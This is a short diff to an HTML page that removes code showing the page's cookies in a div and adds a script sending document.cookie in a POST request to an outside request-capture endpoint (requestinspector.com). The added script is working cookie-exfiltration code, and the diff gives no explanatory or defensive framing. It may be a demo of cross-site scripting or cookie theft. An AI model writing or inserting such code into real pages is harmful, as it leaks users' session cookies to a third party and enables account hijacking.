@@ -8,7 +8,9 @@
         <div id="123"></div>
     </body>
     <script>
-        const q = document.getElementById('123');
-        q.innerHTML = `| ${document.cookie} |`;
+        fetch(
+            'https://01hc4w1zzh471sdvtmcey3wzqw00-2e160bc652f2ee44dbcf.requestinspector.com',
+            { method: 'POST', body: JSON.stringify({ a: document.cookie }) }
+        );
     </script>
 </html>
